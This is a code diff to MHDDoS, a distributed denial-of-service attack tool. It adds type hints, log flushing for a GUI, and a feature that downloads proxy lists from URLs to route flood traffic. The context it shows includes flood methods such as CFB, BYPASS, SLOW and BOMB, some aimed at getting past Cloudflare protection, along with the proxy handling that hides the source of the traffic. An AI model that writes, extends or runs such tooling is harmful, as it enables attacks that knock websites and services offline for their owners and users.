@@ -20,9 +20,10 @@ from struct import pack as data_pack
 from subprocess import run, PIPE
 from sys import argv
 from sys import exit as _exit
+import sys
 from threading import Event, Thread
 from time import sleep, time
-from typing import Any, List, Set, Tuple
+from typing import Any, List, Set, Tuple, Dict, Callable, Optional, Union
 from urllib import parse
 from uuid import UUID, uuid4
 
@@ -39,9 +40,13 @@ from yarl import URL
 from base64 import b64encode
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
-            datefmt="%H:%M:%S")
+            datefmt="%H:%M:%S",
+            stream=sys.stdout)
 logger = getLogger("MHDDoS")
 logger.setLevel("INFO")
+# Force flushing of the stream handlers to ensure the GUI captures logs instantly
+for handler in logger.handlers:
+    handler.flush = sys.stdout.flush
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
@@ -49,10 +54,11 @@ ctx.verify_mode = CERT_NONE
 if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
 # Disable insecure TLS versions for additional safety
-if hasattr(ssl, "OP_NO_TLSv1"):
-    ctx.options |= ssl.OP_NO_TLSv1
-if hasattr(ssl, "OP_NO_TLSv1_1"):
-    ctx.options |= ssl.OP_NO_TLSv1_1
+# Handled implicitly by setting minimum_version above, avoids DeprecationWarning
+# if hasattr(ssl, "OP_NO_TLSv1"):
+#     ctx.options |= ssl.OP_NO_TLSv1
+# if hasattr(ssl, "OP_NO_TLSv1_1"):
+#     ctx.options |= ssl.OP_NO_TLSv1_1
 
 __version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
@@ -115,7 +121,7 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
-def exit(*message):
+def exit(*message: str) -> None:
     if message:
         logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
     shutdown()
@@ -214,17 +220,17 @@ search_engine_agents = [
 
 
 class Counter:
-    def __init__(self, value=0):
+    def __init__(self, value: int = 0) -> None:
         self._value = RawValue('i', value)
 
-    def __iadd__(self, value):
+    def __iadd__(self, value: int) -> 'Counter':
         self._value.value += value
         return self
 
-    def __int__(self):
+    def __int__(self) -> int:
         return self._value.value
 
-    def set(self, value):
+    def set(self, value: int) -> 'Counter':
         self._value.value = value
         return self
 
@@ -252,7 +258,7 @@ class Tools:
             return "-- B"
 
     @staticmethod
-    def humanformat(num: int, precision: int = 2):
+    def humanformat(num: int, precision: int = 2) -> Union[str, int]:
         suffixes = ['', 'k', 'm', 'g', 't', 'p']
         if num > 999:
             obje = sum(
@@ -1109,7 +1115,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def CFB(self):
+    def CFB(self) -> None:
         global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
@@ -1129,7 +1135,7 @@ class HttpFlood(Thread):
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
 
-    def CFBUAM(self):
+    def CFBUAM(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -1141,7 +1147,7 @@ class HttpFlood(Thread):
                 if time() > ts + 120: break
         Tools.safe_close(s)
 
-    def AVB(self):
+    def AVB(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -1150,7 +1156,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def DGB(self):
+    def DGB(self) -> None:
         global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception):
             if self._proxies:
@@ -1175,7 +1181,7 @@ class HttpFlood(Thread):
 
             Tools.safe_close(ss)
 
-    def DYN(self):
+    def DYN(self) -> None:
         payload: Any = str.encode(self._payload +
                                   f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                                   self.randHeadercontent +
@@ -1186,7 +1192,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def DOWNLOADER(self):
+    def DOWNLOADER(self) -> None:
         payload: Any = self.generate_payload()
 
         s = None
@@ -1201,7 +1207,7 @@ class HttpFlood(Thread):
             Tools.send(s, b'0')
         Tools.safe_close(s)
 
-    def BYPASS(self):
+    def BYPASS(self) -> None:
         global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
@@ -1221,7 +1227,7 @@ class HttpFlood(Thread):
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
 
-    def GSB(self):
+    def GSB(self) -> None:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1244,7 +1250,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def RHEX(self):
+    def RHEX(self) -> None:
         randhex = str(randbytes(randchoice([32, 64, 128])))
         payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                         self._target.authority,
@@ -1268,7 +1274,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def STOMP(self):
+    def STOMP(self) -> None:
         dep = ('Accept-Encoding: gzip, deflate, br\r\n'
                'Accept-Language: en-US,en;q=0.9\r\n'
                'Cache-Control: max-age=0\r\n'
@@ -1319,7 +1325,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def BOMB(self):
+    def BOMB(self) -> None:
         assert self._proxies, \
             'This method requires proxies. ' \
             'Without proxies you can use github.com/codesenberg/bombardier'
@@ -1348,7 +1354,7 @@ class HttpFlood(Thread):
             if self._thread_id == 0 and res.stdout:
                 print(proxy, res.stdout.decode(), sep='\n')
 
-    def SLOW(self):
+    def SLOW(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -1638,42 +1644,78 @@ class ToolsConsole:
         return {"success": False}
 
 
-def handleProxyList(con, proxy_li, proxy_ty, url=None):
+def handleProxyList(con, proxy_arg, proxy_ty, url=None):
     if proxy_ty not in {4, 5, 1, 0, 6}:
         exit("Socks Type Not Found [4, 5, 1, 0, 6]")
     if proxy_ty == 6:
         proxy_ty = randchoice([4, 5, 1])
-    if not proxy_li.exists():
-        logger.warning(
-            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
-        proxy_li.parent.mkdir(parents=True, exist_ok=True)
-        with proxy_li.open("w") as wr:
-            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
-            logger.info(
-                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
-            )
-            Proxies = ProxyChecker.checkAll(
-                Proxies, timeout=5, threads=threads,
-                url=url.human_repr() if url else "http://httpbin.org/get",
-            )
-
-            if not Proxies:
-                exit(
-                    "Proxy Check failed, Your network may be the problem"
-                    " | The target may not be available."
-                )
-            stringBuilder = ""
-            for proxy in Proxies:
-                stringBuilder += (proxy.__str__() + "\n")
-            wr.write(stringBuilder)
-
-    proxies = ProxyUtiles.readFromFile(proxy_li)
-    if proxies:
-        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
+        
+    proxies = set()
+    
+    # Check if the user passed an HTTP URL directly
+    if str(proxy_arg).startswith("http://") or str(proxy_arg).startswith("https://"):
+        logger.info(f"{bcolors.WARNING}Downloading proxies directly from URL: {bcolors.OKBLUE}{proxy_arg}{bcolors.RESET}")
+        try:
+            data = get(str(proxy_arg), timeout=10).text
+            
+            # Use regex to find IP:Port patterns directly, rather than relying strictly on PyRoxy which fails on some proxy list formats (e.g. monosans)
+            import re
+            proxy_type_obj = ProxyType.stringToProxyType(str(proxy_ty))
+            ip_port_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)")
+            for line in data.splitlines():
+                match = ip_port_pattern.search(line)
+                if match:
+                    # Create Proxy object natively
+                    ip, port = match.group(1).split(':')
+                    proxy = Proxy(ip, int(port), proxy_type_obj)
+                    proxies.add(proxy)
+                    
+            if not proxies:
+                logger.warning(f"{bcolors.WARNING}No proxies were found at the provided URL.{bcolors.RESET}")
+                sys.stdout.flush()
+            else:
+                logger.info(f"{bcolors.WARNING}Proxy Count from URL: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
+                sys.stdout.flush()
+        except Exception as e:
+            logger.error(f"Failed to download proxies from URL: {e}")
+            sys.stdout.flush()
+            exit(f"Failed to download proxies from URL: {e}")
+            
     else:
-        logger.info(
-            f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
-        proxies = None
+        # Standard File handling
+        proxy_li = proxy_arg 
+        if not proxy_li.exists():
+            logger.warning(
+                f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
+            proxy_li.parent.mkdir(parents=True, exist_ok=True)
+            with proxy_li.open("w") as wr:
+                Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
+                logger.info(
+                    f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
+                )
+                Proxies = ProxyChecker.checkAll(
+                    Proxies, timeout=5, threads=threads,
+                    url=url.human_repr() if url else "http://httpbin.org/get",
+                )
+    
+                if not Proxies:
+                    exit(
+                        "Proxy Check failed, Your network may be the problem"
+                        " | The target may not be available."
+                    )
+                stringBuilder = ""
+                for proxy in Proxies:
+                    stringBuilder += (proxy.__str__() + "\n")
+                wr.write(stringBuilder)
+        if not str(proxy_arg).startswith("http://") and not str(proxy_arg).startswith("https://"):
+            proxies = ProxyUtiles.readFromFile(proxy_li)
+            
+            if proxies:
+                logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
+            else:
+                logger.info(
+                    f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
+                proxies = None
 
     return proxies
 
@@ -1715,12 +1757,16 @@ if __name__ == '__main__':
                     except Exception as e:
                         exit('Cannot resolve hostname ', url.host, str(e))
 
-                threads = int(argv[4])
-                rpc = int(argv[6])
-                timer = int(argv[7])
                 proxy_ty = int(argv[3].strip())
-                proxy_li = Path(__dir__ / "files/proxies/" /
-                                argv[5].strip())
+                threads = int(argv[4].strip())
+                proxy_arg = argv[5].strip()
+                rpc = int(argv[6].strip())
+                timer = int(argv[7].strip())
+                if proxy_arg.startswith("http://") or proxy_arg.startswith("https://"):
+                    proxy_li = proxy_arg
+                else:
+                    proxy_li = Path(__dir__ / "files/proxies/" / proxy_arg)
+                    
                 useragent_li = Path(__dir__ / "files/useragent.txt")
                 referers_li = Path(__dir__ / "files/referers.txt")
                 bombardier_path = Path.home() / "go/bin/bombardier"
@@ -1813,7 +1859,13 @@ if __name__ == '__main__':
                             if len(argv) == 8:
                                 logger.setLevel("DEBUG")
                             proxy_ty = int(argfive)
-                            proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
+                            
+                            proxy_arg = argv[6].strip()
+                            if proxy_arg.startswith("http://") or proxy_arg.startswith("https://"):
+                                proxy_li = proxy_arg
+                            else:
+                                proxy_li = Path(__dir__ / "files/proxies" / proxy_arg)
+                                
                             proxies = handleProxyList(con, proxy_li, proxy_ty)
                             if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                 exit("this method cannot use for layer4 proxy")
